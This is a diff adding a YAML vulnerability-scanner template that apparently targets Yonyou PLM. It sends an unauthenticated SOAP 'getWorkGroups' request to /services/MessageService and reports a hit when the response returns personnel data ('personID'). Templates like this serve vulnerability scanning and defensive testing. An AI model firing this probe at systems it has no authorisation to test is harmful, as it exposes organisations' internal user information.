@@ -1,0 +1,30 @@
+name: poc-yaml-yonyouplm
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /services/MessageService
+      follow_redirects: false
+      headers:
+        User-Agent: >-
+          Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+          like Gecko) Chrome/125.0.0.0 Safari/537.36
+        Accept: >-
+          text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Content-Type: text/xml;charset=UTF-8
+      body: >-
+        <soapenv:Envelope
+        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+        xmlns:mes="MessageService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <mes:getWorkGroups/>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    expression: response.status == 200 && response.body_string.contains("personID")
+expression: r0()
+detail:
+  author: flower
+  links:
+    - flower
